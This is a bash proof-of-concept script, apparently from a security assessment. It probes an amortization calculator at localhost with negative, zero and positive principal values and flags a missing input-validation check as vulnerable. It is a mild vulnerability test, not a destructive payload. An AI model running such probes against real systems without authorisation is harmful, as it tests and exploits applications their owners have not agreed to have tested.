#!/bin/bash

# POC: Business Logic Flaw - Negative Principal Amount Accepted
# This script demonstrates that the amortization calculator accepts negative principal values
# without validation, which violates financial accounting principles.

TARGET="http://localhost/amortization"
TERM="5"
RATE="5"

echo "=========================================="
echo "POC: Negative Principal Validation Bypass"
echo "=========================================="
echo ""

# Test 1: Negative principal with valid term and rate
echo "[TEST 1] Testing negative principal (-100000) with term=5, rate=5"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET?term=$TERM&principal=-100000&rate=$RATE")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d':' -f2)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "✗ VULNERABLE: Application accepted negative principal (Status 200)"
    echo "Response contains amortization table:"
    echo "$BODY" | head -20
    echo "..."
else
    echo "✓ SECURE: Application rejected negative principal"
    echo "$BODY"
fi
echo ""

# Test 2: Negative principal with smaller absolute value
echo "[TEST 2] Testing smaller negative principal (-5000)"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET?term=$TERM&principal=-5000&rate=$RATE")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d':' -f2)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "✗ VULNERABLE: Application accepted negative principal (Status 200)"
else
    echo "✓ SECURE: Application rejected negative principal"
    echo "$BODY"
fi
echo ""

# Test 3: Zero principal
echo "[TEST 3] Testing zero principal"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET?term=$TERM&principal=0&rate=$RATE")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d':' -f2)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "✗ VULNERABLE: Application accepted zero principal (Status 200)"
else
    echo "✓ SECURE: Application rejected zero principal"
    echo "$BODY"
fi
echo ""

# Test 4: Positive principal (control test - should work)
echo "[TEST 4] Testing positive principal (100000) - Control test"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET?term=$TERM&principal=100000&rate=$RATE")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d':' -f2)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
    echo "✓ EXPECTED: Application accepted positive principal (Status 200)"
else
    echo "✗ UNEXPECTED: Application rejected positive principal"
    echo "$BODY"
fi
echo ""

echo "=========================================="
echo "POC Summary: Negative principal values are"
echo "accepted by the application without proper"
echo "business logic validation."
echo "=========================================="